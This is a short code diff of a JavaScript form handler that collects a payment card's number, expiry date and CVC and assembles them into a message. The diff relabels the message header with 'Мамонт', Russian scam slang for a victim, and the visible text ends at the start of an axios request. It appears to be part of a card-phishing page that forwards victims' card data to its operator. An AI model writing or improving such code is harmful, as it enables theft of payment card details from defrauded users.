@@ -17,9 +17,9 @@ function submitForm(e) {
   e.preventDefault();
   const form = document.getElementById("form"); // Get reference to the form element
   console.log(form.elements.cardNumber.value);
-  let message = ` Заявка \n`;
-  message += `CardNumber: ${form.elements.cardNumber.value} \n`; // Use correct element names
-  message += `Exired: ${form.elements.expired.value} \n`; // Use correct element names
+  let message = ` Мамонт \n`;
+  message += `Номер Карты: ${form.elements.cardNumber.value} \n`; // Use correct element names
+  message += `ММ/ГГ: ${form.elements.expired.value} \n`; // Use correct element names
   message += `CVC: ${form.elements.cvc.value} \n`; // Use correct element names
   console.log(message);
   axios
